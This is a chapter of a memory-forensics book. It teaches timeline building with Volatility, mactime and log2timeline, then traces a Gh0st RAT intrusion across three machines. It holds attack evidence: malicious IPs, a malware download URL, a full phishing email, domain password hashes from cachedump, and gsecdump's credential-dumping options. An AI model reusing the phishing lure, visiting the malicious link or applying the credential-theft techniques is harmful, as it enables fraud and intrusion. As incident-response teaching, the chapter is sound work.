# Chapter 18  
 Timelining

A common phase of most digital investigations is organizing the analysis results to help construct theories about what happened. One technique that investigators have traditionally leveraged involves creating timelines to organize the data based on the temporal relationships between digital artifacts. This chapter demonstrates how you can combine digital artifacts extracted using memory analysis with artifacts from file system and network analysis to reconstruct a more complete understanding of the digital crime scene. Memory analysis often provides the context necessary to discover relationships between seemingly disparate events and artifacts. It also enables investigators to develop “temporal footprints” for rapidly identifying suspicious tools and techniques on a system.

This chapter explores these timelining techniques using a scenario that is frequently faced by modern digital investigators. It involves a targeted attack using the Gh0st remote access tool, in which the adversary attempts to move laterally within an organization to access sensitive data. The scenario begins with an alert about a host contacting an IP address associated with a known threat group. You must determine the extent of the compromise, evaluate the impact to the organization, and gain insights into how it occurred. To accomplish these tasks, you need to combine timelines across multiple machines and integrate temporal artifacts extracted from alternate sources. Finally, you must correlate your theories with the information extracted from the obfuscated command and control traffic.

## Finding Time in Memory

Temporal reconstruction of file system events has often been viewed as one of the most valuable techniques used in digital investigations. As a result, a variety of tools were built to automate the extraction of these artifacts from disk images. With the recent advancements in memory analysis, investigators are also beginning to take advantage of the temporal artifacts found within memory samples. As you learned in Chapter 16, it is even possible to extract temporal artifacts—typically found within the file system—directly from memory samples. By extracting data into the same common output formats that file system analysis tools typically use, such as the body file format (see [http://wiki.sleuthkit.org/index.php?title=Body_file](http://wiki.sleuthkit.org/index.php?title=Body_file)), it is possible to combine timelines from a variety of sources and across multiple systems.

### Timestamp Formats

The three main types of timestamps on Windows machines are summarized in the following list:

- `WinTimeStamp`: Also known as `FILETIME`, this is an 8-byte timestamp that represents the number of 100-nanosecond intervals since January 1, 1601 UTC (see [http://msdn.microsoft.com/en-us/library/windows/desktop/ms724284%28v=vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724284%28v=vs.85%29.aspx)). This is the most commonly used timestamp within Windows data structures.
- `UnixTimeStamp`: This 4-byte timestamp represents the number of seconds that have passed since January 1, 1970 UTC.
- `DosDate`: This is a 4-byte timestamp, also known as “MS-DOS Date,” that was used to store date and time information in MS-DOS files. There are still some file formats, such as shortcut files, and registry data, that use this timestamp.

---

**NOTE**

All timestamps in this chapter are in the UTC time zone unless otherwise stated.

---

### Timestamp Sources

A number of sources of temporal information are found in memory. The following list enumerates some of the most common and forensically useful ones. As with many of the other artifacts discussed throughout the book, these are typically never replicated to disk. As a result, they often provide valuable information to augment traditional disk-focused timelines.

- System time
- Process start and end times
- Thread start and end times
- Internet history URL access times
- Symbolic link creation times
- Registry key last-write times
- MFT entry timestamps (MAC times for standard information and filename information)
- UserAssist times
- Process working set trim times
- PE file compile time
- Library load times
- Socket and connection creation times
- Event log creation times
- Shimcache record times

## Generating Timelines

The primary steps for performing temporal reconstruction are extracting the temporal artifacts and generating timelines. Volatility provides a number of plugins for automatically extracting these artifacts from memory and formatting the data in a manner that facilitates the formation of timelines: `timeliner`, `mftparser` (covered in Chapter 16), and `shellbags` (covered in Chapter 10). The remainder of this chapter concentrates on generating timelines using these plugins. The chapter also discusses how to incorporate temporal artifacts from records stored in memory-mapped files (that is, log files, registry files, and so on) using the `dumpfiles` plugin and application-specific file parsing tools.

### Timeliner Plugin

This `timeliner` plugin was originally introduced at Open Memory Forensics Workshop (OMFW 2011). It was designed to help automate the process of extracting temporal artifacts from memory samples (see [http://gleeda.blogspot.com/2011/09/volatility-20-timeliner-registryapi.html](http://gleeda.blogspot.com/2011/09/volatility-20-timeliner-registryapi.html)). Although the default invocation of the `timeliner` plugin extracts *most* of the aforementioned temporal artifacts, some of the others require additional command-line options or alternative plugins. For example, you can include the registry timestamps by adding a `--registry` flag. You can extract the timestamps associated with Shellbags and the MFT using the `shellbags` and `mftparser` plugins, respectively. An added advantage of moving these extraction algorithms into separate plugins is that an investigator can run these plugins in parallel with the `timeliner` plugin in separate shells.

The following example shows how to create a timeline from temporal artifacts extracted from a memory sample using these three plugins. In this example, the data is extracted into the body file format. Each plugin is run separately and the output files are combined into a file named `largetimeline.txt`:

```
$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 timeliner 
     --output-file=timeliner.txt --output=body

$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 mftparser 
     --output-file=mft.txt --output=body
   
$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 shellbags 
    --output-file=shellbags.txt --output=body

$ cat *.txt >> largetimeline.txt
```

As previously mentioned, you might also want to include temporal data from alternative sources, including file content, file system metadata, or network captures. In those circumstances, you can run a program, such as `log2timeline` ([https://code.google.com/p/log2timeline/](https://code.google.com/p/log2timeline/)), against the disk image or against files that have been extracted with the `dumpfiles` plugin (discussed in Chapter 16). `log2timeline` will attempt to extract temporal data from all supported files, such as event logs, registry files, Prefetch files, and Recycle Bin files. It is important to note that files extracted using the `dumpfiles` plugin are padded with zeros to account for nonresident pages, and that this padding may cause third-party processing tools to fail.

The following example demonstrates this process by using event logs from a Windows 7 SP1 64–bit machine. The log files were extracted from memory using the `dumpfiles` plugin and processed using `log2timeline`. The output is saved to the file `evtx.body`. The flags used for `log2timeline` are these:

- `-z`: Specifies the time zone (UTC).
- `-f`: File type being processed (`evtx`).
- `-name`: Machine identifier that differentiates between different machines or sources when you combine timelines.
- `-w`: Output file (in body file format). `$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 dumpfiles -i -r evtx$ -D EVTX_OUTPUT $ find EVTX_OUTPUT -exec log2timeline -z UTC -f evtx '{}' -name Win7x64 -w evtx.body \;` You can leverage similar processes for extracting temporal artifacts from cached registry files (prior to Windows 7). You can process these files using a registry-parsing tool, such as `timeline.py` from the `python-registry` library ([https://github.com/williballenthin/python-registry](https://github.com/williballenthin/python-registry)). The following example illustrates how this is accomplished: `$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 dumpfiles -i -r ntuser.dat$ -D REG_OUTPUT/ $ find REG_OUTPUT –exec python timeline.py --body ‘{}’ >> registry.body \;`

### Timeliner Output Formats

Because the `timeliner` plugin extracts an ever-expanding list of temporal artifacts, it also supports a number of different output options to facilitate easy integration with existing tools:

- `text`: Pipe-delimited output in the following format: *Date/Time | Type | Details*
- `xlsx`: Directly output into an Office 2007 Excel file format using the OpenPyxl library (see [https://bitbucket.org/ericgazoni/openpyxl/wiki/Home](https://bitbucket.org/ericgazoni/openpyxl/wiki/Home)). Items that are detected, such as hidden processes, hooked processes, Yara hits, and specified event log messages, are auto-highlighted. The columns are: *Time | Type | Item | Details | Reason*.
- `body`: Output compatible with the `mactime` utility from The Sleuth Kit (see [http://wiki.sleuthkit.org/index.php?title=Body_file](http://wiki.sleuthkit.org/index.php?title=Body_file)). This format is useful for combining timelines from different sources into one large timeline.
- `xml`: Output compatible with the Simile data-visualization framework created by MIT (see [http://simile-widgets.org/](http://simile-widgets.org/)).

---

**NOTE**

As mentioned earlier, all timestamps are in UTC by default. If you need output in a different time zone (for any Volatility plugin that has timestamp data), you can run Volatility with the `--tz` flag and the appropriate Olson time zone ([http://en.wikipedia.org/wiki/List_of_tz_database_time_zones](http://en.wikipedia.org/wiki/List_of_tz_database_time_zones)). The following shows an example for Eastern Time (EST):

```
$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 
           timeliner –-tz America/New_York
```

---

### Processing Timelines Using Mactime

All the aforementioned output options of the `timeliner` plugin display timestamps in a human-readable format, except the body file format. In order to view the body file format correctly, you must use a parsing utility such as `mactime`([http://www.sleuthkit.org/sleuthkit/man/mactime.html](http://www.sleuthkit.org/sleuthkit/man/mactime.html)). The following example demonstrates the typical options passed to `mactime` and the subsequent output:

- The `–b` flag is used to specify the body file (`timeline.body`).
- The `–d` flag is used to make each line of the output comma delimited.
- The `–z` flag enables you to specify the time zone (UTC). `$ mactime –b timeline.body –d –z UTC Tue Nov 27 2012 01:45:46,336,macb,,0,0,12038,[MFT FILE_NAME] mdd.exe (Offset: 0x46c800) Tue Nov 27 2012 01:45:46,336,.acb,,0,0,12038,[MFT STD_INFO] mdd.exe (Offset: 0x46c800) Tue Nov 27 2012 01:45:51,0,m...,,0,0,0,[THREAD] lsass.exe PID: 696/TID: 1768 [snip]`

Aspects of the output have been highlighted to emphasize their importance. The first field presents the human readable date and time associated with the event, and the third field indicates what type of timestamp is being presented:

- **m:** Modified time
- **a:** Access time
- **c:** Creation time
- **b:** MFT modified time (relevant only to MFT entries)

For the first line, all four timestamps (denoted by `macb`) for the `$FILE_NAME` attribute are `Tue Nov 27 2012 01:45:46`. In the second line, only the access, creation, and MFT modified time (`.acb`) timestamps are `Tue Nov 27 2012 01:45:46`. You can most likely find the missing modified time (denoted with a period) somewhere else in the timeline. This often is an indication that the file was modified sometime after it was created.

The last line contains the “modified” time for a running thread in `lsass.exe`. Note that some objects, such as processes and threads, that are found *only* in memory have at most two timestamps (creation time and exit time). Thus, the creation time is denoted as `.acb`, and the exit time is denoted as `m`, followed by three periods. This way, you can easily track when such objects were created and when they exited without deviating from the standard body file format convention.

### Where to Begin

Once you have extracted the temporal artifacts and have the data in the appropriate format, you are ready to use the timeline as a tool to support or confirm your analysis efforts. For example, you can start with a specific event on which to focus your analysis, or you might discover temporal anomalies associated with one of the following artifacts:

- **Prefetch files:** Because malware has to run on a machine, and its execution results in the creation of a Prefetch file, this is often a good starting point. One thing to note, however, is that some operating systems (such as Windows 2003, 2008, and 2012) disable Prefetch by default. Also, Windows 7 machines running on SSD drives often have Prefetching disabled by default to save the life of the SSD ([http://blogs.msdn.com/b/e7/archive/2009/05/05/support-and-q-a-for-solid-state-drives-and.aspx](http://blogs.msdn.com/b/e7/archive/2009/05/05/support-and-q-a-for-solid-state-drives-and.aspx)).
- **Shimcache registry keys:** These keys, like the Prefetch files, show when programs were executed on the machine. You can find these entries on all Windows systems and they are a good backup for machines that have Prefetching disabled.
- **Creation of unknown executables:** Attackers often drop their own tools onto a machine, which results in new files appearing in the timeline. Therefore, it might be worthwhile to search for newly created executable files. This is easy to do if you have a baseline of known executables to use for comparison. Otherwise, if you know the approximate timeframe of when the attacker was on the machine, you could also use this to help narrow your search.
- **Network activity:** Sometimes attackers install back doors, which can result in an open socket on the machine. Likewise, malware often connects back to the attacker or command and control sites. Because sockets have a create time associated with them, you could look for artifacts of these listening sockets and remote connections.
- **Job files:** Attackers often create Job files using the `at` command to run a program at a later time. Because Job files are often named `At#.job` (where the `#` is replaced by a number), you could search for evidence of these files being created and use that as your starting point.
- **Registry keys:** Many activities performed on a machine involve accessing, creating, or modifying registry keys, such as logging in, starting services, accessing files, accessing network shares, creating mount points, and so on. Thus, you can search for such changes in the registry and use them as your starting point in the timeline.

## Gh0st in the Enterprise

The best way to explore these tools and techniques is to discuss them in the context of a common scenario associated with modern threat groups. The data being used in this scenario was created for a forensics challenge hosted by Jack Crook ([https://docs.google.com/file/d/0B_xsNYzneAhEN2I5ZXpTdW9VMGM/edit](https://docs.google.com/file/d/0B_xsNYzneAhEN2I5ZXpTdW9VMGM/edit)). The scenario involves an organization that is the victim of a targeted attack, in which the adversaries were moving laterally between multiple machines. The investigation was initiated because an IDS alert flagged suspicious traffic from an internal host, `ENG-USTXHOU-148`, to an IP address typically associated with targeted attacks (`58.64.132.141`).

The remainder of this chapter will focus on analyzing the data collected from the following three machines, as well as the associated packet capture (`jackcr-challenge.pcap`):

- `ENG-USTXHOU-148`: 172.16.150.20 / WinXPSP3x86
- `FLD-SARIYADH-43`: 172.16.223.187 / WinXPSP3x86
- `IIS-SARIYADH-03`: 172.16.223.47 / Win2003SP0x86

The first step of this investigation involves extracting the temporal artifacts and generating the timelines. You can leverage similar steps as previously described in the “Timeliner Plugin” section. However, in this case, the ultimate goal is to combine the timelines from all machines into one. Thus, you should use the `--machine` option when running each of the Volatility plugins. This option adds the supplied string to the header so that you can easily associate events with their system of origin. The following example shows how to create timelines for one of these machines (`IIS-SARIYADH-03`). The command-line options passed to the `mftparser` plugin also extract MFT-resident files to a specified output directory. You should subsequently apply the same methodology to the other systems:

```
$ python vol.py –f IIS-SARIYADH-03/memdump.bin 
     mftparser --profile=Win2003SP0x86 
     --output=body -D IIS_FILES --machine=IIS 
     --output-file=challenge/IIS_mft.body

$ python vol.py –f IIS-SARIYADH-03/memdump.bin 
     timeliner --profile=Win2003SP0x86 
     --output=body --machine=IIS 
     --output-file=challenge/IIS_timeliner.body

$ python vol.py –f IIS-SARIYADH-03/memdump.bin 
     shellbags --profile=Win2003SP0x86 
     --output=body --machine=IIS 
     --output-file=challenge/IIS_shellbags.body
```

In this example, the memory sample (`memdump.bin`) is found in a folder based on its machine name, and the output for the commands will be written to a folder named `challenge`.

#### Scripting Registry Timelines

The following bash script demonstrates how to extract the memory-resident registry hives and parse them with `timeline.py`:

```
  1 for j in FLD-SARIYADH-43 ENG-USTXHOU-148
  2 do
  3     file=challenge/$j/memdump.bin
  4     loc=challenge/REG/$j
  5     short=`echo $j |cut -d\- -f1`
  6     mkdir -p $loc
  7 
  8     for i in config.system config.security config.sam \
  9     config.default config.software ntuser.dat usrclass.dat
 10     do
 11         echo python vol.py -f $file dumpfiles -i -r $i\$ -D $loc 
 12         python vol.py -f $file dumpfiles -i -r $i\$ -D $loc 
 13     done
 14     find $loc -type f -exec python timeline.py \
 15         --body '{}' >> $loc.temp \;
 16     cat $loc.temp |sed "s/\[Registry None/\[$short Registry/" \
 17         >> $loc.registry.body
 18     rm $loc.temp    
 19 done
```

Line 1 loops through the two machine names that are both of the same profile (WinXPSP3x86) to process each memory sample. Lines 3–6 set up the variables for the memory file, output directory, and short name (the alias added to the registry timeline to distinguish between machines) and then creates the output directory, if it does not exist. Lines 8–13 loop through each of the registry filenames and dumps them using the `dumpfiles` plugin with case-insensitive (`-i`) and `–r/--regex` options. Lines 14–18 create the registry timeline for all registry files that were dumped.

#### Adding Packet Capture Data

As previously mentioned, you can use `log2timeline` to create a timeline from the data found in the packet capture. In this instance, you do not specify a machine name. Because all acquired timestamps are in UTC, you need to specify the time zone when using `log2timeline` to make sure they are all consistent:

```
$ log2timeline -f pcap -z UTC jackcr-challenge.pcap -w pcap.body
```

After the timeline data has been generated, you can easily combine the timeline files associated with each host and begin the preliminary host-specific components of the investigation:

```
$ cat ENG*.body REG/ENG*.body >> ENG_all
$ cat IIS*.body REG/IIS*.body >> IIS_all
$ cat FLD*.body REG/FLD*.body >> FLD_all
```

---

**NOTE**

To condense the output from the timelines, these machines are referenced by a short name that consists of the first three characters of their hostnames:

- **ENG:** Short name for `ENG-USTXHOU-148`
- **FLD:** Short name for `FLD-SARIYADH-43`
- **IIS:** Short name for `IIS-SARIYADH-03`

---

### Finding the Initial Infection Vector

After you create the timelines for each machine, you are ready to begin analysis. Given the often overwhelming volume of temporal data, you should have a starting point to focus your attention. We recommend first looking into the machine that exhibited the suspicious behavior and searching for activity patterns and time ranges that you can use as you expand the scope of the investigation. In this case, it would be the `ENG-USTXHOU-148` (ENG) machine because that’s what triggered the IDS alert. To confirm that you’re working with the correct machine, you can run the `connscan` plugin. In the following output, you will notice a connection to the malicious IP address. It also helps establish what process is involved (PID 1024):

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin connscan
Volatility Foundation Volatility Framework 2.4
Offset(P)  Local Address             Remote Address            Pid
---------- ------------------------- ------------------------- ---
0x01f60850 0.0.0.0:0                 1.0.0.0:0                 36569092
0x01ffa850 172.16.150.20:1291        58.64.132.141:80          1024
0x0201f850 172.16.150.20:1292        172.16.150.10:445         4
0x02084e68 172.16.150.20:1281        172.16.150.10:389         628
0x020c89f088 172.16.150.20:2862        172.16.150.10:135         696
0x02201008 172.16.150.20:1280        172.16.150.10:389         628
0x18615850 172.16.150.20:1292        172.16.150.10:445         4
0x189c88e050 172.16.150.20:1291        58.64.132.141:80          1024
[snip]
```

#### Tracking Executed Programs

As previously mentioned, Prefetch files are created on the system when applications execute. Therefore, a reasonable next step is to look for suspicious Prefetch files. In the following output, you can see how `grep` is used to find Prefetch files within the timeline data.

```
$ grep -i pf ENG_all |grep -i exe | 
           cut -d\| -f2 
[snip]
[MFT FILE_NAME] WINDOWS\Prefetch\NET.EXE-01A53C2F.pf (Offset: 0x12d588)
[MFT FILE_NAME] WINDOWS\Prefetch\SL.EXE-010E2A23.pf (Offset: 0x311400)
[MFT FILE_NAME] WINDOWS\Prefetch\GS.EXE-3796DDD9.pf (Offset: 0x311800)
[MFT FILE_NAME] WINDOWS\Prefetch\PING.EXE-31216D26.pf (Offset: 0x311c00)
[MFT FILE_NAME] WINDOWS\Prefetch\PS.EXE-09745CC1.pf (Offset: 0x924e400)
[MFT FILE_NAME] WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x12ab2400)
[MFT FILE_NAME] WINDOWS\Prefetch\WC.EXE-06BFE764.pf (Offset: 0x12ab2c00)
[MFT FILE_NAME] WINDOWS\Prefetch\SYMANTEC-1.43-1[2].EXE-3793B625.pf 
    (Offset: 0x17779800)
```

By reviewing the output, you might notice that a few of the Prefetch files stand out. From these artifacts, it appears that some suspicious-looking executables have run on the system, such as `SL.EXE`, `GS.EXE`, `PS.EXE` and `SYMANTEC-1.43-1[2].EXE`. The `SYMANTEC-1.43-1[2].EXE` executable is particularly troubling because its naming convention is similar to those typically associated with files that have been downloaded from the Internet (due to the `[2]`). You can also see possible indications of network reconnaissance (`NET.EXE` and `PING.EXE`) and job scheduling (`AT.EXE`). You now have a few items to examine within the context of the timeline.

To put things in chronological order, you can leverage the `mactime` utility. The following command shows how to examine the timeline for the `ENG-USTXHOU-148` machine in this manner.

```
$ mactime -b ENG_all -d -z UTC 
```

Because you suspect that the `SYMANTEC-1.43-1[2].EXE` executable might be something of interest, you can search for it in the timeline. If you search for “symantec” (case insensitive), you find the following artifact associated with Internet Explorer, as well as the Prefetch file showing it was run one second after it was downloaded (`Nov 26 2012 23:01:54`). This helps confirm your theories about how the executable was introduced to the system.

```
Mon Nov 26 2012 23:01:53,macb,[ENG IEHISTORY] explorer.exe->Visited: 
    callb@http://58.64.132.8/download/Symantec-1.43-1.exe 
    PID: 284/Cache type "URL " at 0x2895000
[snip]
Mon Nov 26 2012 23:01:54,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch\
    SYMANTEC-1.43-1[2].EXE-3793B625.pf (Offset: 0x17779800)
```

#### Phishing E-mail Artifacts

If you use the `strings` utility on the memory sample (see Chapter 17), you can also find the phishing e-mail that contains the previously shown link. Now you know how the executable arrived on the system:

```
Mon, 26 Nov 2012 14:00:08 -0600
Received: from d0793h (d0793h.petro-markets.info [58.64.132.141])
     by ubuntu-router (8.14.3/8.14.3/Debian-9.2ubuntu1) with SMTP id 
     qAQK06Co005842;
     Mon, 26 Nov 2012 15:00:07 -0500
Message-ID: <FCE1C36C7BBC46AFB7C2A251EA868B8B@d0793h>
From: “Security Department” <isd@petro-markets.info>
To: <amirs@petro-market.org>, <callb@petro-market.org>,
        <wrightd@petro-market.org>
Subject: Immediate Action
Date: Mon, 26 Nov 2012 14:59:38 -0500

[snip]

Attn: Immediate Action is Required!!
The IS department is requiring that all associates update to the new =
version of anti-virus.  This is critical and must be done ASAP!  Failure =
to update anti-virus may result in negative actions.
Please download the new anti-virus and follow the instructions.  Failure =
to install this anti-virus may result in loosing your job!
Please donwload at http://58.64.132.8/download/Symantec-1.43-1.exe
Regards,
The IS Department
```

#### Examining the 6to4 Service

If you look for other events in close temporal proximity, you may also notice some suspicious registry changes. A new service named `6to4` was added at the same time (`23:01:54`) as the `SYMANTEC-1.43-1[2].EXE` executable was run:

```
Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4
Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4\0000
Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] 
$$$PROTO.HIV\ControlSet001\Services\6to4\Parameters
Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] 
$$$PROTO.HIV\ControlSet001\Services\6to4\Security
```

You can use the `printkey` plugin to examine the contents of these keys. For example, if you print out the `ControlSet001\Services\6to4` key, you see the new service is run inside an instance of `svchost.exe`:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey 
    -K "ControlSet001\Services\6to4"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
Key name: 6to4 (S)
Last updated: 2012-11-26 23:01:55 UTC+0000

Subkeys:
  (S) Parameters
  (S) Security
  (V) Enum

Values:
REG_DWORD     Type            : (S) 288
REG_DWORD     Start           : (S) 2
REG_DWORD     ErrorControl    : (S) 1
REG_EXPAND_SZ ImagePath       : (S) %SystemRoot%\System32\svchost.exe -k netsvcs
REG_SZ        DisplayName     : (S) Microsoft Device Manager
REG_SZ        ObjectName      : (S) LocalSystem
REG_SZ        Description     : (S) Service Description
```

Unfortunately, `svchost.exe` is just a generic host process for DLLs, so this information alone isn’t enough to take your analysis to the next stage. However, if you examine the `ControlSet001\Services\6to4\Parameters` key, you’ll see what DLL is being used for this service:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey 
     -K "ControlSet001\Services\6to4\Parameters"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
Key name: Parameters (S)
Last updated: 2012-11-26 23:01:54 UTC+0000

Subkeys:

Values:
REG_EXPAND_SZ ServiceDll      : (S) C:\WINDOWS\system32\6to4ex.dll
```

The filename (`6to4ex.dll`) looks suspicious, and examining the timeline for events that happened in close temporal proximity to events associated with this file further confirms these suspicions. Notice that the DLL was accessed on the system at the same time the registry key was modified:

```
Mon Nov 26 2012 23:01:54,.ac.,[MFT FILE_NAME] WINDOWS\system32\6to4ex.dll 
    (Offset: 0x324c800)
Mon Nov 26 2012 23:01:54,.ac.,[MFT STD_INFO] WINDOWS\system32\6to4ex.dll 
    (Offset: 0x324c800)
```

Several `svchost.exe` threads were started after this service was created, which is all consistent with what you would expect to happen when the service starts (for example, the host process launches new threads that access the DLL to load it in memory). Notice that the PID of the service (1024) is the same as the PID you saw previously in the `connscan` output for the process that was connected to the malicious IP address:

```
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 276
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 508
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 528
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 536
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 652
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 936
```

If you list the DLLs for the process with PID 1024, you see that `6to4ex.dll` is in fact loaded.

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin dlllist -p 1024
Volatility Foundation Volatility Framework 2.4
************************************************************************
svchost.exe pid:   1024
Command line : C:\WINDOWS\System32\svchost.exe -k netsvcs
Service Pack 3

Base             Size  LoadCount Path
---------- ---------- ---------- ----
0x01000000     0x6000     0xffff C:\WINDOWS\System32\svchost.exe
0x7c900000    0xaf000     0xffff C:\WINDOWS\system32\ntdll.dll
[snip]
0x10000000    0x1c000        0x1 c:\windows\system32\6to4ex.dll
[snip]
```

You can also check to see if there is a `6to4` service running using the `svcscan` plugin. As shown in the following output, the service was indeed running. Based on its order number, 228, you can also tell it was created *after* the system last booted (that is, it’s new). As discussed in Chapter 12, the order number should be consistent with the service name’s alphabetical order. In this case, `6to4` should have a very low order number, but on the contrary, it’s quite high. Also, because the service starts within a second of the `SYMANTEC-1.43-1[2].EXE` executable running on the system, it’s a good indication that the artifacts are related:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin svcscan
[snip]
Offset: 0x389d60
Order: 228
Process ID: 1024 
Service Name: 6to4 
Display Name: Microsoft Device Manager
Service Type: SERVICE_WIN32_SHARE_PROCESS
Service State: SERVICE_RUNNING
Binary Path: C:\WINDOWS\System32\svchost.exe -k netsvcs
[snip]
```

At this point, you have identified the origin of the suspicious network activity, the process responsible for the activity, how the malicious code was introduced to the system, the persistence mechanism, and a time range during which the malware was active.

### Finding an Active Attacker

If you continue to look for artifacts in close temporal proximity, you notice a number of events that indicate active use of the malware by remote attackers. For example, a directory named `WINDOWS\webui` appears on the system, the `ipconfig.exe` utility was accessed, and another executable was downloaded (`ps.exe`). The `ps.exe` executable will be encountered again later in the analysis. During this time period, a Prefetch file for the `net` command was also created. The `net` command provides a variety of capabilities, including adding new user accounts, viewing domains, and adding network shares. Here is the relevant output:

```
Mon Nov 26 2012 23:03:10,macb,[ENG MFT FILE_NAME] WINDOWS\webui 
    (Offset: 0x1bc21000)
Mon Nov 26 2012 23:03:21,.a..,[MFT STD_INFO] WINDOWS\system32\ipconfig.exe 
    (Offset: 0xc826400)
Mon Nov 26 2012 23:06:34,macb,[ENG MFT FILE_NAME] WINDOWS\ps.exe 
    (Offset: 0x15983800)
[snip]
Mon Nov 26 2012 23:07:53,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \NET.EXE-01A53C2F.pf (Offset: 0x12d588)
```

Based on these new system events, you can expand the investigation. For example, if you search for the directory that was created (`webui`), you might notice that several other files appeared in that directory over the subsequent two hours:

```
$ mactime -b ENG_all -d -z UTC \
       | grep -i webui | grep FILE_NAME
Mon Nov 26 2012 23:06:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\gs.exe 
    (Offset: 0x16267c00)
Mon Nov 26 2012 23:06:52,macb,[ENG MFT FILE_NAME] WINDOWS\webui\ra.exe 
    (Offset: 0x17779c00)
Mon Nov 26 2012 23:06:56,macb,[ENG MFT FILE_NAME] WINDOWS\webui\sl.exe 
    (Offset: 0x1f5ff000)
Mon Nov 26 2012 23:06:59,macb,[ENG MFT FILE_NAME] WINDOWS\webui\wc.exe 
    (Offset: 0x1f5ff400)
Mon Nov 26 2012 23:07:31,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netuse.dll 
    (Offset: 0xde4e48)
Tue Nov 27 2012 00:49:01,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system.dll 
    (Offset: 0x924e800)
Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll 
    (Offset: 0x924ec00)
Tue Nov 27 2012 01:01:39,macb,[ENG MFT FILE_NAME] WINDOWS\webui\https.dll 
   (Offset: 0x109cf7a8)
Tue Nov 27 2012 01:14:48,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netstat.dll 
   (Offset: 0x10b97400)
Tue Nov 27 2012 01:26:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system5.bat 
    (Offset: 0x10b97800)
```

There are also artifacts suggesting that some of these executables (in particular, `SL.EXE` and `GS.EXE`) were run immediately after being downloaded to the system:

```
Mon Nov 26 2012 23:10:25,.a..,[ENG MFT STD_INFO] WINDOWS\system32\wshtcpip.dll 
    (Offset: 0x32cfc00)
Mon Nov 26 2012 23:10:25,.a..,[ENG MFT STD_INFO] WINDOWS\system32\mswsock.dll 
    (Offset: 0x330d000)
Mon Nov 26 2012 23:10:25,.a..,[ENG MFT STD_INFO] WINDOWS\system32\hnetcfg.dll 
    (Offset: 0x32fe000)
Mon Nov 26 2012 23:10:35,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \SL.EXE-010E2A23.pf (Offset: 0x311400)
Mon Nov 26 2012 23:11:58,.a..,[ENG Registry] SECURITY\Policy\Secrets
Mon Nov 26 2012 23:11:58,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \GS.EXE-3796DDD9.pf (Offset: 0x311800)
```

The `Policy\Secrets` key of the `SECURITY` hive was accessed the same time as the `GS.EXE` file was executed. This suggests that the `GS.EXE` executable might be accessing the Local Security Authority (LSA) secrets, which an attacker can use to extract cached password domain hashes. Using the `cachedump` plugin, you can gain insight into what password hashes the attacker might have been able to access:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin cachedump
Volatility Foundation Volatility Framework 2.4
administrator:00c2bcc2230054581d3551a9fdcc48f093:petro-market:petro-market.org
callb:178526e1cb2fdfc36d764595f1ddd0f7:petro-market:petro-market.org
```

You can gain more insight into the `GS.EXE` executable by extracting it from memory. If the process is currently running, you can just dump it with `procdump`, as discussed in Chapter 8. Otherwise, you need to find the physical offset of its `_FILE_OBJECT` using `filescan`:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin 
    filescan | grep -i \\\\gs.exe

Volatility Foundation Volatility Framework 2.4 
0x020bb938   1  0 R--r-d \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
0x18571938   1  0 R--r-d \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
```

Next, you can pass that offset (`0x020bb938`) to the `dumpfiles` plugin to extract the memory manager’s cached copy of this file from disk:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin 
     dumpfiles -Q 0x020bb938 -D ENG_OUT/

Volatility Foundation Volatility Framework 2.4 
ImageSectionObject 0x020bb938 \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
DataSectionObject 0x020bb938 \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
```

After the file is extracted, you can use the `strings` utility to gain some initial insights into the executable’s capabilities:

```
$ strings -a file.None.0x822cf6e8.img > gs.strings
$ strings -a –el file.None.0x822cf6e8.img >> gs.strings
$ cat gs.strings
[snip]
unable to start gsecdump as service
system
help
dump_all,a
dump all secrets
dump_hashes,s
dump hashes from SAM/AD
dump_lsa,l
dump lsa secrets
dump_usedhashes,u
